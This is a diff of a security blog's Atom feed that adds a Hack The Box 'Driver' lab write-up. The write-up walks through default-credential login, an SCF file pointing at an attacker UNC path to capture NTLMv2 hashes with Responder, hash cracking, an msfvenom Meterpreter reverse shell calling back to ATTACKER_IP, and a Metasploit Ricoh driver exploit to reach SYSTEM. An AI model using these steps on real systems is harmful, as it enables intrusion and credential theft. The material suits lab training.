@@ -1,4 +1,221 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-24T18:32:00+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Access</title><link href="http://localhost:4000/posts/access/" rel="alternate" type="text/html" title="Hack The Box: Access" /><published>2026-10-24T00:00:00+05:30</published><updated>2026-10-24T00:00:00+05:30</updated><id>http://localhost:4000/posts/access</id><content type="html" xml:base="http://localhost:4000/posts/access/"><![CDATA[<h1 id="htb-access">HTB Access</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-25T14:11:23+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Driver</title><link href="http://localhost:4000/posts/driver/" rel="alternate" type="text/html" title="Hack The Box: Driver" /><published>2026-10-25T00:00:00+05:30</published><updated>2026-10-25T00:00:00+05:30</updated><id>http://localhost:4000/posts/driver</id><content type="html" xml:base="http://localhost:4000/posts/driver/"><![CDATA[<h1 id="driver---hack-the-box">Driver - Hack The Box</h1>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>I started with an Nmap scan to identify the exposed services.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV  --min-rate 1000 -oN nmap.txt 10.129.95.238
+</code></pre></div></div>
+
+<p>The scan revealed the following open ports:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Microsoft IIS 10.0</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>MSRPC</td>
+      <td>Windows RPC</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td>SMB</td>
+      <td>Microsoft-DS</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td>HTTP</td>
+      <td>WinRM</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>SMB enumeration using anonymous access failed with <code class="language-plaintext highlighter-rouge">NT_STATUS_ACCESS_DENIED</code>, so I moved to the web server.</p>
+
+<h3 id="iis-authentication">IIS Authentication</h3>
+
+<p>Browsing to the target’s HTTP service revealed a Basic Authentication prompt with the realm:</p>
+
+<p><code class="language-plaintext highlighter-rouge">MFP Firmware Update Center. Please enter password for admin</code></p>
+
+<p>I tried the default credentials <code class="language-plaintext highlighter-rouge">admin:admin</code>, which successfully authenticated me.</p>
+
+<p>The application exposed a firmware upload functionality. Uploaded firmware was stored in a directory accessible through SMB and was intended for manual inspection by developers.</p>
+
+<p><img src="/assets/images/driver_image1.png" alt="Driver 1" /></p>
+
+<p>Since uploading a reverse shell as firmware did not produce code execution, I looked for another way to exploit the developer’s interaction with uploaded files.</p>
+
+<h2 id="initial-access">Initial Access</h2>
+
+<h3 id="capturing-ntlmv2-authentication-with-scf">Capturing NTLMv2 Authentication with SCF</h3>
+
+<p>Windows Shell Command Files (<code class="language-plaintext highlighter-rouge">.scf</code>) can trigger outbound network requests when Windows Explorer retrieves their icon from a remote UNC path. This can expose NTLM authentication material without requiring the file to be executed manually.</p>
+
+<p>I created an SCF file referencing an icon hosted on my attacker machine:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[shell]
+Command=2
+IconFile=\\&lt;ATTACKER_IP&gt;\tools\nc.ico
+
+[taskbar]
+Command=ToggleDesktop
+</code></pre></div></div>
+
+<p>I uploaded the file through the firmware upload functionality and started Responder on my VPN interface:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo responder -I tun0 -w -v
+</code></pre></div></div>
+
+<p>When the file was accessed in the relevant Windows Explorer context, the target initiated an SMB authentication request.</p>
+
+<p>Responder captured an NTLMv2 challenge-response belonging to the user <code class="language-plaintext highlighter-rouge">DRIVER\tony</code>.</p>
+
+<blockquote>
+  <p>The captured challenge-response is redacted. It is not a plaintext password.</p>
+</blockquote>
+
+<h3 id="cracking-the-captured-hash">Cracking the Captured Hash</h3>
+
+<p>I saved the captured NetNTLMv2 material to a file and used Hashcat with the RockYou wordlist:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p>Hashcat identified the password. The recovered credential is intentionally redacted.</p>
+
+<p>With the credentials recovered, I established a remote session as <code class="language-plaintext highlighter-rouge">tony</code> using Evil-WinRM.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="identifying-the-vulnerable-printer-driver">Identifying the Vulnerable Printer Driver</h3>
+
+<p>After obtaining access as <code class="language-plaintext highlighter-rouge">tony</code>, I inspected the PowerShell command history:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</code></pre></div></div>
+
+<p>The history revealed that a printer had been installed using the following driver:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-Printer -PrinterName "RICOH_PCL6" `
+  -DriverName 'RICOH PCL6 UniversalDriver V4.23' `
+  -PortName 'lpt1:'
+</code></pre></div></div>
+
+<p>The installed <strong>RICOH PCL6 UniversalDriver V4.23</strong> was the key finding. The driver was associated with a known privilege-escalation vulnerability, <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-19363">CVE-2019-19363</a>.</p>
+
+<p>Metasploit provides a local privilege-escalation module for this Ricoh driver issue.</p>
+
+<h3 id="upgrading-to-a-meterpreter-session">Upgrading to a Meterpreter Session</h3>
+
+<p>I generated a Windows x64 Meterpreter reverse-TCP payload on my attacker machine:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter_reverse_tcp \
+  LHOST=&lt;ATTACKER_IP&gt; LPORT=6666 \
+  -f exe -o meet.exe
+</code></pre></div></div>
+
+<p>I started a Metasploit handler:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter_reverse_tcp
+set LHOST tun0
+set LPORT 6666
+run
+</code></pre></div></div>
+
+<p>From my Evil-WinRM session, I uploaded and executed the payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload meet.exe
+.\meet.exe
+</code></pre></div></div>
+
+<p>A Meterpreter session opened successfully. I backgrounded the session to configure the local privilege-escalation module.</p>
+
+<h3 id="exploiting-the-ricoh-driver">Exploiting the Ricoh Driver</h3>
+
+<p>I searched for the relevant Metasploit module:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search ricoh
+use exploit/windows/local/ricoh_driver_privesc
+</code></pre></div></div>
+
+<p>I configured the Meterpreter session and reverse handler:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set SESSION 1
+set LHOST tun0
+set LPORT 4444
+run
+</code></pre></div></div>
+
+<p>The module’s automatic check confirmed that the target appeared vulnerable because the Ricoh driver directory had full permissions.</p>
+
+<p>Metasploit created a temporary printer, exploited the vulnerable driver configuration, and opened a new Meterpreter session. The module then removed the temporary printer and cleaned up its temporary files.</p>
+
+<h3 id="verifying-system-access">Verifying SYSTEM Access</h3>
+
+<p>I opened a shell in the new Meterpreter session and checked my privileges:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+whoami
+</code></pre></div></div>
+
+<p>The result was:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nt authority\system
+</code></pre></div></div>
+
+<p>The exploit had successfully escalated privileges to SYSTEM.</p>
+
+<h2 id="root-flag">Root Flag</h2>
+
+<p>I navigated to the Administrator desktop:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\Users\Administrator\Desktop
+dir
+</code></pre></div></div>
+
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+
+<ol>
+  <li>
+    <p>Enumerated exposed services and discovered an IIS firmware update portal.</p>
+  </li>
+  <li>
+    <p>Authenticated to the portal using default credentials.</p>
+  </li>
+  <li>
+    <p>Uploaded an SCF file to trigger outbound SMB authentication.</p>
+  </li>
+  <li>
+    <p>Captured and cracked the developer’s NetNTLMv2 challenge-response.</p>
+  </li>
+  <li>
+    <p>Used the recovered credentials to access the machine as <code class="language-plaintext highlighter-rouge">tony</code>.</p>
+  </li>
+  <li>
+    <p>Identified the vulnerable Ricoh printer driver from PowerShell history.</p>
+  </li>
+  <li>
+    <p>Obtained a Meterpreter session and exploited the driver vulnerability.</p>
+  </li>
+  <li>
+    <p>Escalated privileges to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</p>
+  </li>
+</ol>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="windows" /><category term="SCF" /><category term="printer-exploitation" /><category term="metasploit" /><summary type="html"><![CDATA[Driver - Hack The Box]]></summary></entry><entry><title type="html">Hack The Box: Access</title><link href="http://localhost:4000/posts/access/" rel="alternate" type="text/html" title="Hack The Box: Access" /><published>2026-10-24T00:00:00+05:30</published><updated>2026-10-24T00:00:00+05:30</updated><id>http://localhost:4000/posts/access</id><content type="html" xml:base="http://localhost:4000/posts/access/"><![CDATA[<h1 id="htb-access">HTB Access</h1>
 
 <h2 id="1-initial-enumeration">1. Initial Enumeration</h2>
 
